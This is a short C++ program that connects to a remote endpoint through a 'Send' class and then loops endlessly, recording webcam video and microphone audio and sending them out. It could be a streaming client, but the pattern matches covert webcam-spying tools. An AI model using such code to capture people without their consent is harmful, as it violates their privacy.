#include "Send.h"

int main()
{
	if (InternetCheckConnectionW(L"http://www.microsoft.com", FLAG_ICC_FORCE_CONNECTION, 0) == FALSE)
	{
		std::cout << "No connect\n";
		return 0;
	}

	Send info;

	if (!info.Connection()) return 0;

	std::cout << "Connected\n";

	VideoCapture capture(0); //Opening webcam with index 0 (first available webcam)
	if (!capture.isOpened()) {
		std::cout << "\n\n\n\nError open webcam" << std::endl;
		return 0;
	}

	info.OpenAudioDevice();

	for(;true;)
	{
		info.VideoRecording(capture);
		info.SoundRecording();

		info.ToSend();
	}

	capture.release();
	info.Clear();

	return 0;
}
